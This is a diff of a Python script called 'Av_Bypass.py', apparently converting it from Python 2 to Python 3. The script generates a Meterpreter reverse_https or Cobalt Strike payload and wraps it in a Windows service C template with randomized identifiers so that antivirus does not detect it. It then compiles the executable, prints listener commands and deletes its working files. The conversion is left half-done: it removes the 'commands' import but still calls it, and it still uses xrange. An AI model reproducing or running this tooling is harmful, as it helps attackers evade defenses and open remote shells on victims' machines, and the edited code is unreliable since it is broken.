@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # coding: latin-1
-import re, os, sys, socket, struct, commands, subprocess, functools, random, string
+import re, os, sys, socket, struct, subprocess, functools, random, string
 #Techryptic.github.io
 #---------------#----------#
 W  = '\033[0m'  # White    #
@@ -9,10 +9,10 @@ Y  = '\033[1;33m' # Yellow #
 R  = '\033[1;91m' # RED    #
 #---------------#----------#
 
-if len(sys.argv) is not 5:
-    print "Usage: {0} IP PORT msf/cobaltstrike EXECUTABLE_NAME".format(sys.argv[0])
-    print "IP & PORT can either be for CobaltStike or Meterpreter, if adding CobaltStrike Generated Payload use the cobaltstrike parameter above.\n"
-    print "Example: "+G+"Av_Bypass.py 127.0.0.1 8081 msf service.exe\n"+W
+if len(sys.argv) != 5:
+    print ("Usage: {0} IP PORT msf/cobaltstrike EXECUTABLE_NAME".format(sys.argv[0]))
+    print ("IP & PORT can either be for CobaltStike or Meterpreter, if adding CobaltStrike Generated Payload use the cobaltstrike parameter above.\n")
+    print ("Example: "+G+"Av_Bypass.py 127.0.0.1 8081 msf service.exe\n"+W)
     exit()
 ip = sys.argv[1]
 port = sys.argv[2]
@@ -39,38 +39,38 @@ except subprocess.CalledProcessError:
     print(R+"msfvenom"+" [Not Found]\n"+W)
     exit()
 
-print "█ "+G+"Setting up MSFVENOM"+W+"..."+W
+print (""+G+"Setting up MSFVENOM"+W+"..."+W)
 
 if protocol == "msf":
 	msf = commands.getstatusoutput('msfvenom -p windows/meterpreter/reverse_https LHOST='+ip+' LPORT='+port+' -f c > payload.c')
-	print "█ "+G+"Payload Generated"+W+"..."+W
+	print (""+G+"Payload Generated"+W+"..."+W)
 	msf = str(msf)
 	if 'Payload size' in msf:
 		bytes = re.findall(r'Payload size: (.*?) bytes', msf)
 		bytes = int(bytes[0]) + 2
-	print "█ "+G+"Payload Size: "+W+""+str(bytes)+W
+	print (" "+G+"Payload Size: "+W+""+str(bytes)+W)
 	if os.path.isfile("payload.c") and os.access("payload.c", os.R_OK):
-		print "█ "+G+"Found Payload.c and is readable"
+		print (""+G+"Found Payload.c and is readable")
 		pay = commands.getstatusoutput('cat payload.c | grep x')
 		payload = pay[1].replace("unsigned char buf[] = ","")
 		payload = pay[1]
-		print "█ "+R+"Meterpreter Listener: "+Y+"use exploit/multi/handler"+W
-		print "█ "+R+"                      "+Y+"set payload windows/meterpreter/reverse_https"+W
-		print "█ "+R+"                      "+Y+"set LHOST "+ip+W
-		print "█ "+R+"                      "+Y+"set RPORT "+port+W
+		print (""+R+"Meterpreter Listener: "+Y+"use exploit/multi/handler"+W)
+		print (""+R+"                      "+Y+"set payload windows/meterpreter/reverse_https"+W)
+		print (""+R+"                      "+Y+"set LHOST "+ip+W)
+		print (""+R+"                      "+Y+"set RPORT "+port+W)
 	else:
-		print "█ "+R+"Either the payload.c file is missing or not readable"
+		print (""+R+"Either the payload.c file is missing or not readable")
 		exit()
 
 if protocol == "cobaltstrike":
-	print "█ "+G+"Looking for CobaltStrikes Generated Payload"+W+"..."+W
+	print (""+G+"Looking for CobaltStrikes Generated Payload"+W+"..."+W)
 	if os.path.isfile("payload.c") and os.access("payload.c", os.R_OK):
-		print "█ "+G+"Found Payload.c and is readable"
+		print (""+G+"Found Payload.c and is readable")
 		pay = commands.getstatusoutput('cat payload.c | grep x')
 		payload = pay[1].replace("unsigned char buf[] = ","")
 		bytes = int("1200")
 	else:
-		print "█ "+R+"Either the payload.c file is missing or not readable"
+		print (""+R+"Either the payload.c file is missing or not readable")
 		exit()
 
 rand = "".join( [random.choice(string.letters[:26]) for i in xrange(5)] )
@@ -79,7 +79,7 @@ randbuff = "".join( [random.choice(string.letters[:26]) for i in xrange(4)] )
 randlpPayload = "".join( [random.choice(string.letters[:26]) for i in xrange(9)] )
 randdate = "b"+"".join( [random.choice(string.letters[:26]) for i in xrange(4)] )
 
-print "█ "+G+"Injecting Payload"+W+"..."+W
+print (""+G+"Injecting Payload"+W+"..."+W)
 s = """#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
@@ -153,12 +153,12 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
 }
 """
-print "█ "+G+"Writing to C File"+W+"..."+W
+print (""+G+"Writing to C File"+W+"..."+W)
 fout = open("wrap.c", "w")
 fout.write(s)
 fout.close()
-print "█ "+G+"Compiling Windows Service Executable..:"+W+" "+ExecutableName+W
+print (""+G+"Compiling Windows Service Executable..:"+W+" "+ExecutableName+W)
 os.system("i686-w64-mingw32-gcc wrap.c -o "+ExecutableName)
-print "█ "+G+"Cleaning up"+W+"..."+W
+print (""+G+"Cleaning up"+W+"..."+W)
 os.system("rm wrap.c | rm payload.c")
-print "█ "+G+"FINISHED"+W+"..."+W
+print (""+G+"FINISHED"+W+"..."+W)
